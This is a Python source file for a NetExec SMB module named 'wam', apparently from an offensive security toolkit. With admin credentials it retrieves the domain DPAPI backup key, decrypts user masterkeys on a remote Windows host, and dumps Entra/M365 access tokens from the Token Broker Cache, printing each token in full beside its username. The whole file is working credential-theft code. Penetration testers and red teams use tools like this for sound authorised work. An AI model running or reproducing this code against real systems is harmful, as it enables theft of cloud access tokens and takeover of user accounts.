import re
import jwt
from dploot.triage.wam import WamTriage
from dploot.lib.target import Target

from nxc.helpers.logger import highlight
from nxc.protocols.smb.dpapi import collect_masterkeys_from_target, get_domain_backup_key, upgrade_to_dploot_connection


class NXCModule:
    name = "wam"
    description = "Dump access token from Token Broker Cache. More info here https://blog.xpnsec.com/wam-bam/. Module by zblurx"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        """ """

    def on_admin_login(self, context, connection):
        username = connection.username
        password = getattr(connection, "password", "")
        nthash = getattr(connection, "nthash", "")

        self.pvkbytes = get_domain_backup_key(connection)


        target = Target.create(
            domain=connection.domain,
            username=username,
            password=password,
            target=connection.host if not connection.kerberos else connection.hostname + "." + connection.domain,
            lmhash=getattr(connection, "lmhash", ""),
            nthash=nthash,
            do_kerberos=connection.kerberos,
            aesKey=connection.aesKey,
            no_pass=True,
            use_kcache=getattr(connection, "use_kcache", False),
        )
        
        conn = upgrade_to_dploot_connection(connection=connection.conn, target=target)
        if conn is None:
            context.log.debug("Could not upgrade connection")
            return
        
        self.masterkeys = collect_masterkeys_from_target(connection, target, conn, system=False)

        if len(self.masterkeys) == 0:
            context.log.fail("No masterkeys looted")
            return

        context.log.success(f"Got {highlight(len(self.masterkeys))} decrypted masterkeys. Looting Token Broker Cache access tokens")

        def token_callback(token):
            for attrib in token.attribs:
                if attrib["Key"].decode() == "WTRes_Token":
                    # Extract every access token
                    for access_token in re.findall(r"e[yw][A-Za-z0-9-_]+\.(?:e[yw][A-Za-z0-9-_]+)?\.[A-Za-z0-9-_]{2,}(?:(?:\.[A-Za-z0-9-_]{2,}){2})?", attrib.__str__()):
                        decoded_token = jwt.decode(access_token, options={"verify_signature": False})
                        if "preferred_username" in decoded_token:
                            # Assuming that if there is no preferred_username key, this is not a valid Entra/M365 Access Token
                            context.log.highlight(f"[{token.winuser}] {decoded_token['preferred_username']}: {access_token}")

        try:
            triage = WamTriage(target=target, conn=conn, masterkeys=self.masterkeys, per_token_callback=token_callback)
            triage.triage_wam()
        except Exception as e:
            context.log.debug(f"Could not loot access tokens: {e}")
